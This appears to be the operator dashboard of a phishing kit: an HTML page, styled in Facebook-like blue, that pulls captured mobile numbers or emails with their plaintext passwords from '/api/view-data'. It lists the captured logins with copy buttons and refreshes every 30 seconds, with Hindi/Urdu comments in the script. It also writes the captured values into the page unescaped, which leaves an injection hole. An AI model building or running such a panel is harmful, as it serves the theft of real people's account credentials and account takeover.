<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - User Data</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
        }

        body {
            background-color: #0a0e27;
            color: #fff;
            min-height: 100vh;
            padding: 30px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid #1e2a4a;
        }

        .header h1 {
            font-size: 1.8rem;
            color: #fff;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .header h1 i {
            color: #1877f2;
        }

        .header .stats {
            display: flex;
            gap: 15px;
        }

        .stat-box {
            background: #141a35;
            padding: 12px 20px;
            border-radius: 10px;
            border: 1px solid #1e2a4a;
            text-align: center;
        }

        .stat-box .number {
            font-size: 1.5rem;
            font-weight: bold;
            color: #1877f2;
        }

        .stat-box .label {
            font-size: 0.8rem;
            color: #8899bb;
            margin-top: 4px;
        }

        .refresh-btn {
            background: #1877f2;
            color: #fff;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 1rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: background 0.2s;
        }

        .refresh-btn:hover {
            background: #166fe5;
        }

        .table-container {
            background: #141a35;
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid #1e2a4a;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        thead {
            background: #1a2245;
        }

        thead th {
            padding: 16px 20px;
            text-align: left;
            font-size: 0.85rem;
            color: #8899bb;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 600;
        }

        tbody tr {
            border-bottom: 1px solid #1e2a4a;
            transition: background 0.2s;
        }

        tbody tr:hover {
            background: #1a2245;
        }

        tbody tr:last-child {
            border-bottom: none;
        }

        tbody td {
            padding: 16px 20px;
            font-size: 0.95rem;
        }

        .badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            background: #1877f2;
            color: #fff;
        }

        .password-cell {
            font-family: monospace;
            color: #ff6b6b;
            background: #2a1a1a;
            padding: 4px 10px;
            border-radius: 6px;
            font-size: 0.85rem;
        }

        .time-cell {
            color: #8899bb;
            font-size: 0.85rem;
        }

        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #8899bb;
        }

        .empty-state i {
            font-size: 3rem;
            margin-bottom: 20px;
            color: #1e2a4a;
        }

        .loading {
            text-align: center;
            padding: 60px 20px;
            color: #8899bb;
        }

        .loading i {
            font-size: 2rem;
            animation: spin 1s linear infinite;
            color: #1877f2;
        }

        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        .copy-btn {
            background: transparent;
            color: #8899bb;
            border: none;
            cursor: pointer;
            font-size: 0.9rem;
            padding: 4px 8px;
            border-radius: 4px;
        }

        .copy-btn:hover {
            color: #1877f2;
            background: #1e2a4a;
        }

        @media (max-width: 768px) {
            body {
                padding: 15px;
            }

            .header {
                flex-direction: column;
                gap: 20px;
                align-items: flex-start;
            }

            .header h1 {
                font-size: 1.3rem;
            }

            .header .stats {
                width: 100%;
            }

            .stat-box {
                flex: 1;
                padding: 10px;
            }

            .stat-box .number {
                font-size: 1.2rem;
            }

            thead th,
            tbody td {
                padding: 12px 10px;
                font-size: 0.8rem;
            }

            .password-cell {
                font-size: 0.7rem;
                padding: 3px 6px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <h1>
                <i class="fa-solid fa-user-shield"></i>
                Admin Panel
            </h1>
            <div class="stats">
                <div class="stat-box">
                    <div class="number" id="totalUsers">0</div>
                    <div class="label">Total Users</div>
                </div>
                <button class="refresh-btn" onclick="loadData()">
                    <i class="fa-solid fa-rotate"></i>
                    Refresh
                </button>
            </div>
        </div>

        <div class="table-container">
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Mobile / Email</th>
                        <th>Password</th>
                        <th>Time</th>
                    </tr>
                </thead>
                <tbody id="dataBody">
                    <tr>
                        <td colspan="4" class="loading">
                            <i class="fa-solid fa-spinner"></i>
                            <p style="margin-top: 10px;">Loading data...</p>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>

    <script>
        async function loadData() {
            const tbody = document.getElementById('dataBody');
            const totalEl = document.getElementById('totalUsers');

            try {
                const response = await fetch('/api/view-data');
                const result = await response.json();

                tbody.innerHTML = '';

                if (!result.data || result.data.length === 0) {
                    tbody.innerHTML = `
                        <tr>
                            <td colspan="4" class="empty-state">
                                <i class="fa-solid fa-inbox"></i>
                                <p>Abhi tak koi data save nahi hua.</p>
                            </td>
                        </tr>
                    `;
                    totalEl.textContent = '0';
                    return;
                }

                totalEl.textContent = result.total;

                result.data.forEach((user, index) => {
                    const row = document.createElement('tr');
                    
                    const time = new Date(user.data.timestamp).toLocaleString();
                    const mobile = user.data.mobile || user.key.replace('user:', '');

                    row.innerHTML = `
                        <td><span class="badge">${index + 1}</span></td>
                        <td>
                            <strong>${mobile}</strong>
                            <button class="copy-btn" onclick="copyText('${mobile}')">
                                <i class="fa-solid fa-copy"></i>
                            </button>
                        </td>
                        <td><span class="password-cell">${user.data.password || 'N/A'}</span></td>
                        <td class="time-cell">${time}</td>
                    `;
                    tbody.appendChild(row);
                });

            } catch (error) {
                console.error('Error:', error);
                tbody.innerHTML = `
                    <tr>
                        <td colspan="4" class="empty-state">
                            <i class="fa-solid fa-exclamation-triangle"></i>
                            <p>Error loading data. Please try again.</p>
                        </td>
                    </tr>
                `;
            }
        }

        function copyText(text) {
            navigator.clipboard.writeText(text);
            alert('Copied: ' + text);
        }

        // Page load par data fetch karein
        loadData();

        // Har 30 second mein auto-refresh
        setInterval(loadData, 30000);
    </script>

</body>
</html>
